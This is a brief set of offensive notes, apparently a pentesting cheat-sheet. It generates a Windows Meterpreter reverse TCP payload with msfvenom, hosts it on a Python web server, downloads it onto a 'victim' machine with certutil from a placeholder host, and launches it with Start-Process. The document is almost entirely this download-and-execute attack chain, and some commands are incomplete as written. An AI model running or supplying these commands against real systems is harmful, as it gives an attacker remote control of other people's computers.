### Using MSF Venom Generate a simple payload

```msfvenom -p windows/x64/meterpreter_reverse_tcp ```

### Set up an http.server and use PS on victim to download payload

```python3 http.server [port-number]```

```certutil -urlcache -split -f http://path.to.server:8000/test.exe```

```Start-Process test.exe```